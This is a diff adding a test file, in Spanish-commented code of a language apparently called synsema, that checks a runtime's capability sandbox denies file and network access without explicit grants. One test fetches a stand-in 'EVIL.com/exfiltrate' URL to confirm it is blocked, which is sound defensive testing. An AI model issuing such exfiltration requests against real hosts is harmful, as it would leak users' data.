@@ -1,0 +1,75 @@
+-- Gemelo de engine_security.rs (synsema-runtime/tests/it, capa 5 — seguridad del motor) (v0.6.68).
+-- El .rs corre run_source_secure (secure=True, sin auto-grants); bajo `synsema test` stdout/time
+-- quedan auto-concedidos, pero file/net deniegan igual: la aserción esencial (violación con el
+-- mensaje exacto) es idéntica en ambos modos. Los strings exactos se afirman sin el prefijo
+-- decorado "Runtime error: ". Los requires van al tope del bloque (un require dentro de un task
+-- NO concede) y los grants se acumulan entre bloques de la misma corrida: los deny usan
+-- recursos sin require previo.
+-- QUEDA en Rust (el .rs tiene 6 tests; migran 4):
+--   intent_freeze_blocks_redeclaration: el freeze sólo dispara con `intent:` a nivel de archivo
+--     tras empezar la ejecución; dentro del gemelo ni en un task ni dentro de try levanta el
+--     error (verificado con probes) — un intent duplicado rompería el archivo entero.
+--   time_builtins_require_time_capability: bajo `synsema test` el corredor auto-concede time:
+--     now()/sleep() no deniegan sin require time (verificado con probe), así que el caso
+--     secure=True del .rs no es observable desde el lenguaje.
+-- Correr con: synsema test tests/engine_security.test.syn
+
+task expect_error(f, needle)
+    let ok be false
+    try
+        f()
+    recover err
+        set ok to true
+        assert(contains(err, needle))
+    assert(ok)
+
+test "secure_read_file_without_capability_is_violation"
+    -- leer sin la capability file -> violación (el grant de stdout no habilita read_file).
+    task f()
+        give read_file("/etc/hostname")
+    expect_error(f, "Capability")
+
+test "capability_violations_exact_strings"
+    task fread()
+        give read_file("/tmp/x.txt")
+    let e1 be ""
+    try
+        fread()
+    recover err
+        set e1 to err
+    assert_eq(e1, "Capability not granted: file_read(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.read(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+    task fwrite()
+        give write_file("/tmp/x.txt", "hi")
+    let e2 be ""
+    try
+        fwrite()
+    recover err
+        set e2 to err
+    assert_eq(e2, "Capability not granted: file_write(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.write(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+    -- fetch: el scope es el hostname del URL (no el URL completo), en minúsculas.
+    task fnet()
+        give fetch("https://EVIL.com/exfiltrate")
+    let e3 be ""
+    try
+        fnet()
+    recover err
+        set e3 to err
+    assert_eq(e3, "Capability not granted: net(\"evil.com\") — this is a permission, not a bug: add `require net(\"evil.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+
+test "require_net_does_not_cover_file"
+    require net("example.com")
+    task f()
+        give read_file("/tmp/x.txt")
+    let e be ""
+    try
+        f()
+    recover err
+        set e to err
+    assert_eq(e, "Capability not granted: file_read(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.read(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+
+test "intent_does_not_authorize_anything"
+    -- el texto del intent (en cualquier idioma) no concede capabilities.
+    intent: "Solo analizar numeros en espanol"
+    task f()
+        give read_file("/tmp/x.txt")
+    expect_error(f, "Capability")
